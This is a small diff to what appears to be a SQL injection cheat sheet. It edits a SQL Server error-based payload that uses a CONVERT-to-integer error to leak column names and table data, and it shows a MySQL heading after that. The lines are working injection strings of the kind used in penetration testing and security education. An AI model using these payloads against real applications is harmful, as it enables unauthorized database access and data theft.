@@ -74,7 +74,7 @@ SQL Server
 (CASE WHEN 1=CONVERT(INT, (SELECT TOP 1 column_name FROM information_schema.columns where table_name = 'test' AND column_name NOT IN ('id'))) THEN 1 ELSE 2 END)
 
 /* data */
-(CASE WHEN 1=CONVERT(INT, (SELECT TOP 1 column1+';'+column2 FROM [database].dbo.test where id=3)) THEN 1 ELSE 2 END)
+(CASE WHEN 1=CONVERT(INT, (SELECT TOP 1 column1+';'+column2 FROM [database].dbo.test where id = '1')) THEN 1 ELSE 2 END)
 ```
 
 ### :open_file_folder: MySQL
